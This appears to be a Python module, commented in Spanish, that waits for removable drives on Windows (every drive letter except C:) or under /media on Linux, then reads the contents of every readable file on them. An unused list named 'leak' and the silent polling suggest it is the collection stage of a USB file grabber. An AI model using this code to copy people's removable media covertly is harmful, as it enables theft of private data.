# -*- coding: UTF-8 -*-

import os
from time import sleep

def init(directory=None):

    leak = []

    if (directory == None):

        if (os.name == 'nt'):

            dirs = ['{}:'.format(x) for x in [chr(ord('a')+x) for x in range(0, 26)] if (os.access('{}:'.format(x), os.R_OK) == True) and os.access('{}:'.format(x), os.X_OK) and not (x == 'c')]

        elif (os.name == 'posix'):

            # En Linux require montaje manual (Algunas veces)

            dirs = ['/media']

        else:

            raise NotImplementedError('No está preparado para este sistema')

    else:

        if (isinstance(directory, str)):

            dirs = [directory]

        else:

            raise TypeError('El tipo de dato de la ruta no es correcta')

    for _ in dirs:

        for root, directorys, files in os.walk(_):

            for file_ in files:

                filename = os.path.join(root, file_)

                if (os.access(filename, os.R_OK) == True):

                    yield filename

def copy(filename):

    with open(filename, 'rb') as file_obj:

        return(filename, file_obj.read())

def copytree(directory=None):

    for _ in init(directory):

        yield copy(_)

def detect(directory=None):

    while (True):

        try:

            next(init(directory))

        except:

            sleep(1)
            continue

        else:

            return(copytree(directory))
